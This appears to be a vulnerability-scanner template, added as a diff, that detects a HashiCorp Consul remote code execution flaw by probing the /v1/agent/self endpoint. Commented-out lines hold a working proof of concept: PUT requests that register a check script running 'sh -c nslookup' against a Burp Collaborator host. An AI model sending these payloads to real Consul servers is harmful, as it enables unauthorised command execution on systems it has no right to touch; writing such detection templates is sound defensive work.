@@ -1,0 +1,53 @@
+id: hasicorp-consul-rce
+info:
+  name: Hashicorp Consul RCE
+  risk: Potential
+
+params:
+  - root: "{{.BaseURL}}"
+  - dest: "t3xc2xpi6jd3rwpz7jgc4w4s2j8dw2.burpcollaborator.net"
+
+variables:
+  - ran: RandomString(6)
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}/v1/agent/self
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
+  ### below is real RCE poc
+  # - method: PUT
+  #   redirect: false
+  #   url: >-
+  #     {{.root}}/v1/session/create
+  #   headers:
+  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+  #     - X-Consul-Token: ''
+  #   body: |
+  #     {"ID":"{{.ran}}","Name":"{{.ran}}","Address":"127.0.0.1","Port":80,"check":{"script":"nslookup {{.Domain}}.{{.dest}}","interval":"10s"}}
+  #   detections:
+  #     - >-
+  #       StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
+
+  # - method: PUT
+  #   redirect: false
+  #   url: >-
+  #     {{.root}}/v1/agent/service/register
+  #   headers:
+  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+  #     - X-Consul-Token: ''
+  #   body: |
+  #     {"ID":"{{.ran}}","Name":"{{.ran}}","Address":"127.0.0.1","Port":80,"check":{"script":"nslookup {{.Domain}}.{{.dest}}","Args":["sh","-c","nslookup {{.Domain}}.{{.dest}}"],"interval":"10s","Timeout":"86400s"}}
+  #   detections:
+  #     - >-
+  #       StatusCode() == 200 && (StringSearch("body", '"EnableScriptChecks":true') || StringSearch("body", '"EnableRemoteScriptChecks":true') || StringSearch("body", '"DisableRemoteExec":false'))
+
+
+references:
+  - link1: https://www.exploit-db.com/exploits/46073
+  - link2: https://www.exploit-db.com/exploits/46074
